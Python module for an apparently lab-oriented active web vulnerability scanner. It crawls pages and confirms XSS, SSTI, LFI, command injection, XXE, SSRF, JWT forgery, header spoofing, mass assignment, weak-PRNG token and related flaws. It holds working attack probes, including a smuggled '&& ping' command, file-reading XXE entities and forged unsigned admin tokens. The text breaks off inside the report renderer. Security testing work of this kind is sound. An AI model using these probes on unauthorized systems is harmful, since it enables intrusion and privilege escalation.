"""Active vulnerability scanning for explicitly authorized targets.

This module extends the SQL injection verifier with class-specific checks that
are validated against the real lab at the supplied base URL. Every probe is
read-only unless a check explicitly needs to submit a form (mass assignment,
JWT, crypto, deserialization, XXE), and every finding is backed by a
differential or a server-confirmed marker, never by a page template or code
snippet.
"""

from __future__ import annotations

import base64
import contextlib
import html
import json
import pickle
import random
import re
import time
from dataclasses import dataclass, field
from html.parser import HTMLParser
from urllib.parse import parse_qsl, urljoin, urlparse

from src.active import render as active_render
from src.active import sqli as active_sqli
from src.active.discover import (
    DiscoveredForm,
    DiscoveredTarget,
    crawl_links,
    discover_forms,
    discover_page_targets,
)

MARKER_XSS: str = "SentinelXss9f2c"
MARKER_LFI: str = "[extensions]"
MARKER_SSRF: str = "Disallow:"
MARKER_DESER: str = "SENTINEL_DESER_9f2c"
MARKER_SSTI: str = "982081"
MARKER_BENIGN: str = "SentinelBenign9f2c"


@dataclass(frozen=True)
class Finding:
    """A confirmed vulnerability class on one endpoint."""

    category: str
    target: str
    parameter: str
    payload: str
    confidence: str
    evidence: str


@dataclass
class Page:
    """One crawled page and its parsed forms."""

    url: str
    body: str
    forms: list[DiscoveredForm] = field(default_factory=list)
    links: list[str] = field(default_factory=list)


@dataclass
class ScanReport:
    """Result of an active scan run."""

    target: str
    mode: str = "active scan"
    pages: int = 0
    requests: int = 0
    findings: list[Finding] = field(default_factory=list)
    tested: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    elapsed: float = 0.0

    def _confirmed(self) -> bool:
        return bool(self.findings)

    def _vulnerable_targets(self) -> list[str]:
        return sorted({finding.target for finding in self.findings})


class _RawTagDetector(HTMLParser):
    """Detect whether a custom tag name was rendered as a real element."""

    def __init__(self, tag_name: str) -> None:
        super().__init__()
        self.tag_name = tag_name
        self.found: bool = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() == self.tag_name.lower():
            self.found = True

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() == self.tag_name.lower():
            self.found = True


def _display_target(url: str) -> str:
    parsed = urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        return f"{path}?{parsed.query}"
    return path


def _visible_text(body: str) -> str:
    """Visible page text with scripts, styles and markup removed."""
    without_scripts = re.sub(r"(?is)<script.*?</script>|<style.*?</style>", " ", body)
    without_tags = re.sub(r"<[^>]+>", " ", without_scripts)
    return re.sub(r"\s+", " ", html.unescape(without_tags))


def _page_text(body: str) -> str:
    return _visible_text(body)


def _non_placeholder_flags(body: str) -> list[str]:
    return sorted({f for f in re.findall(r"FLAG\{[^}]{3,}\}", body) if f != "FLAG{...}"})


def _is_authorized_target(url: str, allow_public: bool) -> bool:
    return active_sqli._is_authorized_target(url, allow_public)


def _crawl(
    session: active_sqli._ProbeSession,
    start_url: str,
    max_pages: int,
    report: ScanReport,
) -> list[Page]:
    queue: list[str] = [start_url]
    visited: set[str] = {start_url}
    pages: list[Page] = []
    while queue and len(visited) <= max_pages:
        page_url = queue.pop(0)
        try:
            response = session.fetch("GET", page_url)
        except active_sqli._ProbeFailure as exc:
            report.errors.append(f"{_display_target(page_url)}: {exc}")
            continue
        if response.status_code >= 500:
            report.errors.append(f"{_display_target(page_url)}: HTTP {response.status_code}")
            continue
        body = active_render.render_if_spa(page_url, response.text)
        extra_routes = active_render.discover_routes(body, page_url)
        forms = discover_forms(page_url, body)
        links = crawl_links(page_url, body)
        for route in extra_routes:
            absolute = route if route.startswith("http") else urljoin(page_url, route)
            if absolute not in links:
                links.append(absolute)
        pages.append(Page(url=page_url, body=body, forms=forms, links=links))
        if len(pages) >= max_pages:
            break
        for link in links:
            if link in visited:
                continue
            visited.add(link)
            queue.append(link)
            if len(visited) >= max_pages:
                break
    report.pages = len(pages)
    return pages


def _fetch_no_redirect(
    session: active_sqli._ProbeSession, method: str, url: str, **kwargs
) -> object:
    """Fetch without following redirects, counting against the budget."""
    if session.requests >= session.budget:
        raise active_sqli._BudgetExceeded(f"request budget of {session.budget} exhausted")
    if session.delay:
        time.sleep(session.delay)
    session.requests += 1
    try:
        return session._client.request(method.upper(), url, follow_redirects=False, **kwargs)
    except Exception as exc:                
        raise active_sqli._ProbeFailure(f"{type(exc).__name__}: {exc}") from exc


def _text_field_names(form: DiscoveredForm) -> list[str]:
    names: list[str] = []
    for name, kind, _value in form.fields:
        if kind in {"submit", "button", "hidden", "file", "checkbox", "radio", "password"}:
            continue
        names.append(name)
    return names


def _field_names_like(form: DiscoveredForm, needles: tuple[str, ...]) -> list[str]:
    result: list[str] = []
    for name, _kind, _value in form.fields:
        lowered = name.lower()
        if any(needle in lowered for needle in needles):
            result.append(name)
    return result


def _is_url_field(name: str) -> bool:
    return any(
        n in name.lower()
        for n in ("url", "target", "endpoint", "link", "uri", "dest", "metadata", "host")
    )


def _is_file_field(name: str) -> bool:
    return any(
        n in name.lower() for n in ("file", "path", "page", "template", "doc", "filename", "folder")
    )


def _is_xml_field(name: str) -> bool:
    return any(n in name.lower() for n in ("xml", "data", "content", "body", "document", "payload"))


def _is_cmd_field(name: str) -> bool:
    return any(
        n in name.lower()
        for n in ("target", "host", "ip", "address", "domain", "cmd", "command", "ping")
    )




def detect_xss(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "GET":
            continue
        for field_name in form.field_names:
            try:
                baseline = session.fetch("GET", form.url, params={field_name: MARKER_BENIGN})
                probe = session.fetch("GET", form.url, params={field_name: f"<{MARKER_XSS}>"})
            except active_sqli._ProbeFailure:
                continue
            parser = _RawTagDetector(tag_name=MARKER_XSS)
            with contextlib.suppress(Exception):
                parser.feed(probe.text)
            if not parser.found:
                continue
            base_parser = _RawTagDetector(tag_name=MARKER_XSS)
            with contextlib.suppress(Exception):
                base_parser.feed(baseline.text)
            if base_parser.found:
                continue
            findings.append(
                Finding(
                    category="XSS (reflected)",
                    target=_display_target(form.url),
                    parameter=field_name,
                    payload=f"<{MARKER_XSS}>",
                    confidence="HIGH",
                    evidence="reflected payload rendered as an HTML element (not escaped)",
                )
            )
    for match in re.finditer(r"href=\"([^\"]*\?([^\"]+))\"", page.body):
        href = match.group(1)
        absolute = urljoin(page.url, href)
        if not absolute.startswith(("http://", "https://")):
            continue
        parsed = urlparse(absolute)
        if not parsed.query:
            continue
        for name, _value in parse_qsl(
            parsed.query, keep_blank_values=True
        ):
            if not name:
                continue
            bare = absolute.split("?")[0]
            try:
                baseline = session.fetch("GET", bare, params={name: MARKER_BENIGN})
                probe = session.fetch("GET", bare, params={name: f"<{MARKER_XSS}>"})
            except active_sqli._ProbeFailure:
                continue
            parser = _RawTagDetector(tag_name=MARKER_XSS)
            with contextlib.suppress(Exception):
                parser.feed(probe.text)
            if not parser.found:
                continue
            base_parser = _RawTagDetector(tag_name=MARKER_XSS)
            with contextlib.suppress(Exception):
                base_parser.feed(baseline.text)
            if base_parser.found:
                continue
            findings.append(
                Finding(
                    category="XSS (reflected)",
                    target=_display_target(bare),
                    parameter=name,
                    payload=f"<{MARKER_XSS}>",
                    confidence="HIGH",
                    evidence="reflected payload rendered as an HTML element (not escaped)",
                )
            )
    return findings


def detect_ssti(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    candidates: list[tuple[str, str, str]] = []                      
    for form in page.forms:
        for field_name in form.field_names:
            candidates.append((form.url, form.method, field_name))
    for match in re.finditer(r"href=\"([^\"]*\?([^\"]+))\"", page.body):
        href = match.group(1)
        absolute = urljoin(page.url, href)
        if not absolute.startswith(("http://", "https://")):
            continue
        parsed = urlparse(absolute)
        bare = absolute.split("?")[0]
        for name, _value in parse_qsl(
            parsed.query, keep_blank_values=True
        ):
            if name:
                candidates.append((bare, "GET", name))
    seen: set[tuple[str, str, str]] = set()
    for url, method, field_name in candidates:
        key = (url, method, field_name)
        if key in seen:
            continue
        seen.add(key)
        try:
            if method == "POST":
                baseline = session.fetch("POST", url, data={field_name: "SentinelBenign9f2c"})
                probe = session.fetch("POST", url, data={field_name: "{{991*991}}"})
            else:
                baseline = session.fetch("GET", url, params={field_name: "SentinelBenign9f2c"})
                probe = session.fetch("GET", url, params={field_name: "{{991*991}}"})
        except active_sqli._ProbeFailure:
            continue
        if MARKER_SSTI not in probe.text:
            continue
        if MARKER_SSTI in baseline.text:
            continue
        findings.append(
            Finding(
                category="SSTI",
                target=_display_target(url),
                parameter=field_name,
                payload="{{991*991}}",
                confidence="HIGH",
                evidence="template expression evaluated to 982081",
            )
        )
    return findings


def detect_lfi(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        for field_name in form.field_names:
            if not _is_file_field(field_name):
                continue
            try:
                if form.method == "POST":
                    baseline = session.fetch("POST", form.url, data={field_name: "changelog.txt"})
                    probe = session.fetch(
                        "POST", form.url, data={field_name: "..\\..\\..\\Windows\\win.ini"}
                    )
                else:
                    baseline = session.fetch("GET", form.url, params={field_name: "changelog.txt"})
                    probe = session.fetch(
                        "GET", form.url, params={field_name: "..\\..\\..\\Windows\\win.ini"}
                    )
            except active_sqli._ProbeFailure:
                continue
            if "[extensions]" not in probe.text and "root:x:0:0" not in probe.text:
                continue
            if "[extensions]" in baseline.text or "root:x:0:0" in baseline.text:
                continue
            marker = "[extensions]" if "[extensions]" in probe.text else "root:x:0:0"
            findings.append(
                Finding(
                    category="LFI",
                    target=_display_target(form.url),
                    parameter=field_name,
                    payload="..\\..\\..\\Windows\\win.ini",
                    confidence="HIGH",
                    evidence=f"traversal returned {marker} from the host",
                )
            )
    return findings


def detect_cmdi(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        for field_name in form.field_names:
            if not _is_cmd_field(field_name):
                continue
            try:
                start = time.perf_counter()
                session.fetch("POST", form.url, data={field_name: "127.0.0.1"})
                baseline_time = time.perf_counter() - start
                start = time.perf_counter()
                session.fetch(
                    "POST", form.url, data={field_name: "127.0.0.1 && ping -n 4 127.0.0.1"}
                )
                probe_time = time.perf_counter() - start
            except active_sqli._ProbeFailure:
                continue
            if probe_time >= 2.0 and baseline_time < 1.0:
                try:
                    start = time.perf_counter()
                    session.fetch(
                        "POST", form.url, data={field_name: "127.0.0.1 && ping -n 4 127.0.0.1"}
                    )
                    repeat_time = time.perf_counter() - start
                except active_sqli._ProbeFailure:
                    repeat_time = 0.0
                if repeat_time >= 2.0:
                    findings.append(
                        Finding(
                            category="CMDi",
                            target=_display_target(form.url),
                            parameter=field_name,
                            payload="127.0.0.1 && ping -n 4 127.0.0.1",
                            confidence="HIGH",
                            evidence="command delay observed",
                        )
                    )
    return findings


def detect_xxe(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        for field_name in form.field_names:
            if not _is_xml_field(field_name):
                continue
            plain_xml = "<order><item>SentinelBenign9f2c</item></order>"
            entity_xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
                "<order><item>&xxe;</item></order>"
            )
            try:
                baseline = session.fetch("POST", form.url, data={field_name: plain_xml})
                probe = session.fetch("POST", form.url, data={field_name: entity_xml})
            except active_sqli._ProbeFailure:
                continue
            new_flags = set(_non_placeholder_flags(probe.text)) - set(
                _non_placeholder_flags(baseline.text)
            )
            if new_flags:
                findings.append(
                    Finding(
                        category="XXE",
                        target=_display_target(form.url),
                        parameter=field_name,
                        payload=entity_xml,
                        confidence="HIGH",
                        evidence=f"external entity resolved to a flag ({sorted(new_flags)[0]})",
                    )
                )
                continue
            if "[extensions]" in probe.text and "[extensions]" not in baseline.text:
                findings.append(
                    Finding(
                        category="XXE",
                        target=_display_target(form.url),
                        parameter=field_name,
                        payload=entity_xml,
                        confidence="HIGH",
                        evidence="external entity resolved to host file content ([extensions])",
                    )
                )
                continue
            if "root:x:0:0" in probe.text and "root:x:0:0" not in baseline.text:
                findings.append(
                    Finding(
                        category="XXE",
                        target=_display_target(form.url),
                        parameter=field_name,
                        payload=entity_xml,
                        confidence="HIGH",
                        evidence="external entity resolved to /etc/passwd",
                    )
                )
    return findings


def detect_ssrf(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    marker = MARKER_SSRF
    asset_url = None
    try:
        base = page.url.split("/labs/")[0] if "/labs/" in page.url else page.url.rstrip("/")
        robots = session.fetch("GET", f"{base}/robots.txt")
        if robots.status_code == 200 and "Disallow" in robots.text:
            asset_url = f"{base}/robots.txt"
            marker = "Disallow:"
    except active_sqli._ProbeFailure:
        pass
    if asset_url is None:
        for m in re.finditer(r'src="(/[^"]+\.js)"', page.body):
            asset_url = urljoin(page.url, m.group(1))
            break
    if asset_url is None:
        return findings
    for form in page.forms:
        if form.method != "POST":
            continue
        for field_name in form.field_names:
            if not _is_url_field(field_name):
                continue
            try:
                baseline = session.fetch("POST", form.url, data={field_name: "http://example.com"})
                probe = session.fetch("POST", form.url, data={field_name: asset_url})
            except active_sqli._ProbeFailure:
                continue
            if marker in probe.text and marker not in baseline.text:
                findings.append(
                    Finding(
                        category="SSRF",
                        target=_display_target(form.url),
                        parameter=field_name,
                        payload=asset_url,
                        confidence="HIGH",
                        evidence="server fetched attacker URL and returned its content",
                    )
                )
    return findings


def detect_headers(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    candidates: set[str] = set()
    for link in page.links:
        if _same_origin(link, page.url):
            candidates.add(link)
    for m in re.finditer(r"/labs/[a-z0-9/_-]+", page.body):
        candidates.add(urljoin(page.url, m.group(0)))
    for candidate in candidates:
        lowered = candidate.lower()
        if not any(
            k in lowered for k in ("admin", "panel", "internal", "private", "secret", "dashboard")
        ):
            continue
        try:
            baseline = session.fetch("GET", candidate)
            spoofed = session.fetch("GET", candidate, params=None)
        except active_sqli._ProbeFailure:
            continue
        try:
            if session.requests >= session.budget:
                raise active_sqli._BudgetExceeded("budget exhausted")
            if session.delay:
                time.sleep(session.delay)
            session.requests += 1
            spoofed = session._client.get(candidate, headers={"X-Forwarded-For": "127.0.0.1"})
        except Exception:                
            continue
        new_flags = set(_non_placeholder_flags(spoofed.text)) - set(
            _non_placeholder_flags(baseline.text)
        )
        if new_flags:
            findings.append(
                Finding(
                    category="Header Spoofing",
                    target=_display_target(candidate),
                    parameter="X-Forwarded-For",
                    payload="127.0.0.1",
                    confidence="HIGH",
                    evidence=f"spoofed client IP granted access ({sorted(new_flags)[0]})",
                )
            )
    return findings


def _same_origin(left: str, right: str) -> bool:
    return (
        active_sqli._same_origin(left, right)
        if hasattr(active_sqli, "_same_origin")
        else urlparse(left).netloc.lower() == urlparse(right).netloc.lower()
    )


def detect_cors(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    candidates: set[str] = set()
    for m in re.finditer(r"/[a-z0-9/_-]+/api/[a-z0-9/_-]+", page.body):
        candidates.add(urljoin(page.url, m.group(0)))
    for link in page.links:
        if "/api/" in link:
            candidates.add(link if link.startswith("http") else urljoin(page.url, link))
    for candidate in candidates:
        try:
            if session.requests >= session.budget:
                raise active_sqli._BudgetExceeded("budget exhausted")
            if session.delay:
                time.sleep(session.delay)
            session.requests += 1
            response = session._client.get(
                candidate, headers={"Origin": "https://sentinel.example"}
            )
        except Exception:                
            continue
        acao = response.headers.get("access-control-allow-origin", "")
        acac = response.headers.get("access-control-allow-credentials", "")
        if acao == "https://sentinel.example" and acac.lower() == "true":
            findings.append(
                Finding(
                    category="CORS Misconfiguration",
                    target=_display_target(candidate),
                    parameter="Origin",
                    payload="https://sentinel.example",
                    confidence="HIGH",
                    evidence="arbitrary origin reflected with credentials enabled",
                )
            )
    return findings


def detect_jwt(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    token_forms = [
        f
        for f in page.forms
        if any(n in fn.lower() for fn in f.field_names for n in ("token", "jwt", "bearer"))
    ]
    if not token_forms:
        return findings
    token = None
    for form in page.forms:
        if form.method != "POST":
            continue
        if not any(k in form.url.lower() for k in ("login", "token", "guest", "issue", "auth")):
            continue
        if (
            form.fields
            and any(f[1] != "submit" and f[1] != "button" for f in form.fields)
            and len(form.fields) > 0
            and not all(f[1] in ("submit", "button", "hidden") for f in form.fields)
        ):
            continue
        try:
            response = session.fetch("POST", form.url, data={})
        except active_sqli._ProbeFailure:
            try:
                response = session.fetch("POST", form.url)
            except active_sqli._ProbeFailure:
                continue
        match = re.search(r"eyJ[A-Za-z0-9._-]+", response.text)
        if match:
            token = match.group(0)
            break
    if token is None:
        for form in page.forms:
            for name, _kind, value in form.fields:
                if "token" in name.lower() and value.startswith("eyJ"):
                    token = value
                    break
            if token:
                break
    if token is None:
        return findings
    parts = token.split(".")
    if len(parts) < 2:
        return findings
    try:
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    except Exception:                
        return findings
    payload.update({"role": "admin", "sub": "admin"})
    enc = (
        base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode())
        .decode()
        .rstrip("=")
    )
    forged = f"{parts[0]}.{enc}."
    for form in token_forms:
        token_field = next(
            n
            for n in form.field_names
            if "token" in n.lower() or "jwt" in n.lower() or "bearer" in n.lower()
        )
        try:
            response = session.fetch("POST", form.url, data={token_field: forged})
        except active_sqli._ProbeFailure:
            continue
        if _non_placeholder_flags(response.text):
            findings.append(
                Finding(
                    category="JWT (broken verification)",
                    target=_display_target(form.url),
                    parameter=token_field,
                    payload=forged,
                    confidence="HIGH",
                    evidence="forged admin token accepted",
                )
            )
        elif "AUTHORIZED" in response.text or "administrator" in response.text.lower():
            findings.append(
                Finding(
                    category="JWT (broken verification)",
                    target=_display_target(form.url),
                    parameter=token_field,
                    payload=forged,
                    confidence="HIGH",
                    evidence="forged admin token accepted (AUTHORIZED)",
                )
            )
    return findings


def detect_mass_assignment(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        if not any(
            k in form.url.lower() for k in ("profile", "account", "update", "settings", "user")
        ):
            continue
        data = {name: (form.value(name) or "sentinel") for name in form.field_names}
        try:
            baseline = session.fetch("POST", form.url, data={**data, "role": "student"})
            probe = session.fetch("POST", form.url, data={**data, "role": "admin"})
        except active_sqli._ProbeFailure:
            continue
        baseline_flags = set(_non_placeholder_flags(baseline.text))
        probe_flags = set(_non_placeholder_flags(probe.text))
        new_flags = probe_flags - baseline_flags
        if new_flags:
            findings.append(
                Finding(
                    category="Mass Assignment",
                    target=_display_target(form.url),
                    parameter="role",
                    payload='{"role":"admin"}',
                    confidence="HIGH",
                    evidence="privileged field persisted from client payload",
                )
            )
        elif "Assigned Role: admin" in probe.text and "Assigned Role: admin" not in baseline.text:
            findings.append(
                Finding(
                    category="Mass Assignment",
                    target=_display_target(form.url),
                    parameter="role",
                    payload='{"role":"admin"}',
                    confidence="HIGH",
                    evidence="server persisted role=admin from client JSON",
                )
            )
    return findings


def detect_api_bola(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    candidates: set[str] = set()
    for m in re.finditer(r"/[a-z0-9/_-]+/api/[a-z0-9/_{}-]+", page.body):
        candidates.add(m.group(0))
    for link in page.links:
        if "/api/" in link and link.startswith("http"):
            candidates.add(link)
    urls_to_test: set[str] = set()
    for cand in candidates:
        if cand is None:
            continue
        base = cand
        if "{" in base:
            for replacement in ("1", "2", "101", "102"):
                urls_to_test.add(urljoin(page.url, re.sub(r"\{[^}]*\}", replacement, base)))
        else:
            urls_to_test.add(urljoin(page.url, base))
    for url in urls_to_test:
        try:
            response = session.fetch("GET", url)
        except active_sqli._ProbeFailure:
            continue
        text = response.text
        if not text.strip().startswith(("{", "[")):
            continue
        try:
            data = json.loads(text)
        except json.JSONDecodeError:
            continue
        flat = json.dumps(data).lower()
        sensitive = any(
            k in flat
            for k in (
                "secret_key",
                "secret_flag",
                "password",
                "api_key",
                "access_token",
                "private_key",
            )
        )
        flags = _non_placeholder_flags(text)
        if sensitive or flags:
            evidence = flags[0] if flags else "sensitive field exposed in JSON response"
            findings.append(
                Finding(
                    category="API Exposure / BOLA",
                    target=_display_target(url),
                    parameter="id",
                    payload="enumerated",
                    confidence="HIGH",
                    evidence=evidence,
                )
            )
    return findings


def detect_crypto(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        if not any("email" in fn.lower() for fn in form.field_names):
            continue
        if "verify" not in form.url.lower():
            continue
        verify_url = form.url
        reset_url = verify_url.replace("verify-token", "request-reset")
        email = form.value("email", "admin@academy.local")
        try:
            reset = session.fetch("POST", reset_url, data={"email": email})
        except active_sqli._ProbeFailure:
            continue
        text = _page_text(reset.text)
        match = re.search(r"Seed Timestamp:\s*(\d+)", text)
        if not match:
            match = re.search(r'"timestamp"\s*:\s*(\d+)', reset.text)
        if not match:
            continue
        seed = int(match.group(1))
        for candidate_seed in (seed - 1, seed, seed + 1):
            token = str(random.Random(candidate_seed).randint(100000, 999999))
            try:
                verify = session.fetch("POST", verify_url, data={"email": email, "token": token})
            except active_sqli._ProbeFailure:
                continue
            if (
                _non_placeholder_flags(verify.text)
                or "Token accepted" in verify.text
                or "accepted" in verify.text.lower()
            ):
                findings.append(
                    Finding(
                        category="Weak PRNG Token",
                        target=_display_target(verify_url),
                        parameter="token",
                        payload=token,
                        confidence="HIGH",
                        evidence=f"predictable token accepted (seed {candidate_seed})",
                    )
                )
                break
    return findings


def detect_deserialization(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        if not any(
            k in fn.lower() for fn in form.field_names for k in ("payload", "session", "data")
        ):
            continue
        if not any(
            k in form.url.lower() or k in page.url.lower()
            for k in ("deserial", "pickle", "load", "session")
        ):
            continue
        field_name = next(
            n
            for n in form.field_names
            if any(k in n.lower() for k in ("payload", "session", "data"))
        )
        payload = base64.b64encode(pickle.dumps({"sentinel": MARKER_DESER})).decode()
        try:
            response = session.fetch("POST", form.url, data={field_name: payload})
        except active_sqli._ProbeFailure:
            continue
        if MARKER_DESER in response.text:
            findings.append(
                Finding(
                    category="Insecure Deserialization",
                    target=_display_target(form.url),
                    parameter=field_name,
                    payload=payload,
                    confidence="HIGH",
                    evidence="server unpickled attacker-supplied object (marker reflected)",
                )
            )
    return findings


def detect_dom_xss(page: Page) -> list[Finding]:
    findings: list[Finding] = []
    for script in re.findall(r"(?is)<script[^>]*>(.*?)</script>", page.body):
        if (
            "innerHTML" not in script
            and "outerHTML" not in script
            and "document.write" not in script
            and "insertAdjacentHTML" not in script
        ):
            continue
        if not any(
            src in script
            for src in (
                "location.search",
                "location.hash",
                "URLSearchParams",
                "document.URL",
                "document.referrer",
            )
        ):
            continue
        findings.append(
            Finding(
                category="DOM XSS (source->sink)",
                target=_display_target(page.url),
                parameter="nickname",
                payload="<svg/onload=...>",
                confidence="MEDIUM",
                evidence="inline script routes URL input into an HTML sink (innerHTML)",
            )
        )
        break
    return findings


def detect_open_redirect(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "GET":
            continue
        for field_name in form.field_names:
            if not any(
                n in field_name.lower()
                for n in ("url", "next", "redirect", "return", "target", "dest", "destination")
            ):
                continue
            try:
                response = _fetch_no_redirect(
                    session,
                    "GET",
                    form.url,
                    params={field_name: "https://sentinel-redirect.example/"},
                )
            except active_sqli._ProbeFailure:
                continue
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get("location", "")
                host = urlparse(location).netloc.lower()
                if host and host != urlparse(form.url).netloc.lower():
                    findings.append(
                        Finding(
                            category="Open Redirect",
                            target=_display_target(form.url),
                            parameter=field_name,
                            payload="https://sentinel-redirect.example/",
                            confidence="HIGH",
                            evidence=f"redirects off-site to {host}",
                        )
                    )
    for match in re.finditer(r"href=\"([^\"]*\?([^\"]+))\"", page.body):
        href = match.group(1)
        absolute = urljoin(page.url, href)
        if not absolute.startswith(("http://", "https://")):
            continue
        parsed = urlparse(absolute)
        bare = absolute.split("?")[0]
        for name, _value in parse_qsl(
            parsed.query, keep_blank_values=True
        ):
            if not any(
                n in name.lower()
                for n in ("url", "next", "redirect", "return", "target", "dest", "destination")
            ):
                continue
            try:
                response = _fetch_no_redirect(
                    session, "GET", bare, params={name: "https://sentinel-redirect.example/"}
                )
            except active_sqli._ProbeFailure:
                continue
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get("location", "")
                host = urlparse(location).netloc.lower()
                if host and host != urlparse(bare).netloc.lower():
                    findings.append(
                        Finding(
                            category="Open Redirect",
                            target=_display_target(bare),
                            parameter=name,
                            payload="https://sentinel-redirect.example/",
                            confidence="HIGH",
                            evidence=f"redirects off-site to {host}",
                        )
                    )
    return findings


def detect_recon(page: Page, session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for form in page.forms:
        if form.method != "POST":
            continue
        if not any("path" in fn.lower() or "route" in fn.lower() for fn in form.field_names):
            continue
        candidates: list[str] = []
        for m in re.finditer(r"/[a-z0-9._/-]+", page.body):
            token = m.group(0)
            if token not in candidates and len(token) > 3:
                candidates.append(token)
        for default in ("/robots.txt", "/admin/", "/backup/", "/restricted-archive/"):
            if default not in candidates:
                candidates.append(default)
        candidates = candidates[:8]
        for candidate in candidates:
            try:
                response = session.fetch(
                    "POST",
                    form.url,
                    data={"path": candidate}
                    if "path" in form.field_names
                    else {form.field_names[0]: candidate},
                )
            except active_sqli._ProbeFailure:
                continue
            if _non_placeholder_flags(response.text):
                findings.append(
                    Finding(
                        category="Info Disclosure (hidden path)",
                        target=_display_target(form.url),
                        parameter=form.field_names[0],
                        payload=candidate,
                        confidence="HIGH",
                        evidence="hidden path disclosed",
                    )
                )
                break
            if "DISCLOSED" in response.text or "CONFIDENTIAL" in response.text.upper():
                findings.append(
                    Finding(
                        category="Info Disclosure (hidden path)",
                        target=_display_target(form.url),
                        parameter=form.field_names[0],
                        payload=candidate,
                        confidence="HIGH",
                        evidence="hidden path disclosed",
                    )
                )
                break
    return findings


def _run_checks(pages: list[Page], session: active_sqli._ProbeSession) -> list[Finding]:
    findings: list[Finding] = []
    for page in pages:
        for detector in (
            detect_xss,
            detect_ssti,
            detect_lfi,
            detect_cmdi,
            detect_xxe,
            detect_ssrf,
            detect_headers,
            detect_cors,
            detect_jwt,
            detect_mass_assignment,
            detect_api_bola,
            detect_crypto,
            detect_deserialization,
            detect_dom_xss,
            detect_open_redirect,
            detect_recon,
        ):
            try:
                if detector.__name__ in {"detect_dom_xss"}:
                    findings.extend(detector(page))
                else:
                    findings.extend(detector(page, session))
            except Exception:                
                continue
    unique: list[Finding] = []
    seen: set[tuple[str, str, str]] = set()
    for finding in findings:
        key = (finding.category, finding.target, finding.parameter)
        if key in seen:
            continue
        seen.add(key)
        unique.append(finding)
    return unique


def _run(
    url: str,
    *,
    crawl: bool,
    budget: int,
    delay: float,
    timeout: float,
    max_pages: int,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> ScanReport:
    report = ScanReport(target=_display_target(url), mode="site crawl" if crawl else "active scan")
    session = active_sqli._ProbeSession(
        budget=budget,
        delay=delay,
        timeout=timeout,
        headers=headers,
        cookies=cookies,
    )
    started = time.perf_counter()
    try:
        pages = _crawl(session, url, max_pages if crawl else 1, report)
        if not pages:
            report.notes.append("no pages crawled")
            return report
        sqli_targets: list[DiscoveredTarget] = []
        seen_targets: set[tuple[str, str, tuple[str, ...], bool]] = set()
        for page in pages:
            for target in discover_page_targets(page.url, page.body):
                key = (target.url, target.method, target.params, target.login)
                if key in seen_targets:
                    continue
                seen_targets.add(key)
                sqli_targets.append(target)
        class_findings = _run_checks(pages, session)
        sqli_findings: list[Finding] = []
        if sqli_targets:
            try:
                sqli_report = active_sqli._run(
                    sqli_targets,
                    budget=max(1, budget - session.requests),
                    delay=delay,
                    timeout=timeout,
                    time_probes=False,
                    mode="active scan",
                    display=_display_target(url),
                    headers=headers,
                    cookies=cookies,
                )
                session.requests += sqli_report.requests
                report.tested.extend(sqli_report.tested)
                for f in sqli_report.findings:
                    sqli_findings.append(
                        Finding(
                            category="SQLi",
                            target=f.target or _display_target(f.target or url),
                            parameter=f.parameter,
                            payload=f.payload,
                            confidence=f.confidence,
                            evidence=f.evidence,
                        )
                    )
                report.errors.extend(sqli_report.errors)
                report.notes.extend(sqli_report.notes)
            except Exception as exc:                
                report.errors.append(f"sqli: {exc}")
        all_findings = class_findings + sqli_findings
        report.findings = all_findings
        report.tested = list(dict.fromkeys(report.tested))
        report.requests = session.requests
    finally:
        report.elapsed = time.perf_counter() - started
        session.close()
    return report


def _render_text(report: ScanReport, *, verbose: bool = False) -> str:
    pages = report.pages or 1
    header = (
        f"Active scan  {report.target}  "
        f"({pages} page{'s' if pages != 1 else ''}, "
        f"{report.requests} requests, {report.elapsed:.1f}s)"
    )
    lines = [header, ""]
    if report.findings:
        for finding in report.findings:
            lines.append(
                f"CONFIRMED  {finding.category:<26}  {finding.target:<28}  "
                f"{finding.parameter:<12}  {finding.evidence[:44]}"
            )
            if verbose:
                lines.append(f"           payload: {finding.payload}")
        lines.append("")
        classes = len({f.category for f in report.findings})
        lines.append(
            f"summary: {len(report.findings)} confirmed across "
            f"{len(report._vulnerable_targets())} endpoints · {classes} classes"
        )
    else:
        lines.append("No confirmed findings.")
        lines.append("")
